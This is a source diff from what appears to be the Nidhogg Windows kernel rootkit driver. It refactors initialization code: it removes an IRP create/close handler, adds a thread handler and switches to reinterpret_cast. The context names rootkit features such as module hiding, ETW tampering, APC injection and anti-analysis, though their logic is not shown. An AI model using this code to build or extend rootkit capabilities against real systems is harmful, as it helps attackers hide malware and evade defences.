@@ -208,24 +208,6 @@ void ExecuteInitialOperations() {
 
 /*
 * Description:
-* NidhoggCreateClose is responsible for creating a success response for given IRP.
-*
-* Parameters:
-* @DeviceObject [PDEVICE_OBJECT] -- Not used.
-* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
-*
-* Returns:
-* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
-*/
-NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
-	Irp->IoStatus.Status = STATUS_SUCCESS;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	return STATUS_SUCCESS;
-}
-
-/*
-* Description:
 * ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
 *
 * Parameters:
@@ -236,6 +218,7 @@ NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 */
 void ClearAll() {
 	delete NidhoggProcessHandler;
+	delete NidhoggThreadHandler;
 	delete NidhoggFileUtils;
 	delete NidhoggMemoryUtils;
 	delete NidhoggAntiAnalysis;
@@ -270,9 +253,14 @@ bool InitializeFeatures() {
 	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);
 
 	// Initialize utils.
-	NidhoggProcessHandler = new ProcessUtils();
+	NidhoggProcessHandler = new ProcessHandler();
 
 	if (!NidhoggProcessHandler)
+		return false;
+
+	NidhoggThreadHandler = new ThreadHandler();
+
+	if (!NidhoggThreadHandler)
 		return false;
 
 	NidhoggFileUtils = new FileUtils();
@@ -301,25 +289,27 @@ bool InitializeFeatures() {
 		return false;
 
 	// Initialize functions.
-	if (!(PULONG)MmCopyVirtualMemory)
+	if (!reinterpret_cast<PULONG>(MmCopyVirtualMemory))
 		Features.ReadData = false;
 
-	if (!(PULONG)ZwProtectVirtualMemory || !Features.ReadData)
+	if (!reinterpret_cast<PULONG>(ZwProtectVirtualMemory) || !Features.ReadData)
 		Features.WriteData = false;
 
-	if (!Features.WriteData || !(PULONG)PsGetProcessPeb)
+	if (!Features.WriteData || !reinterpret_cast<PULONG>(PsGetProcessPeb))
 		Features.FunctionPatching = false;
 
-	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList || !&PsLoadedModuleResource)
+	if (!reinterpret_cast<PULONG>(PsGetProcessPeb) || !reinterpret_cast<PULONG>(PsLoadedModuleList) || 
+		!&PsLoadedModuleResource)
 		Features.ModuleHiding = false;
 
-	if (!(PULONG)ObReferenceObjectByName)
+	if (!reinterpret_cast<PULONG>(ObReferenceObjectByName))
 		Features.FileProtection = false;
 
-	if (!(PULONG)KeInsertQueueApc)
+	if (!reinterpret_cast<PULONG>(KeInsertQueueApc))
 		Features.EtwTiTamper = false;
 
-	if (!(PULONG)KeInitializeApc || !(PULONG)KeInsertQueueApc || !(PULONG)KeTestAlertThread || !(PULONG)ZwQuerySystemInformation)
+	if (!reinterpret_cast<PULONG>(KeInitializeApc) || !reinterpret_cast<PULONG>(KeInsertQueueApc) || 
+		!reinterpret_cast<PULONG>(KeTestAlertThread) || !reinterpret_cast<PULONG>(ZwQuerySystemInformation))
 		Features.ApcInjection = false;
 
 	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
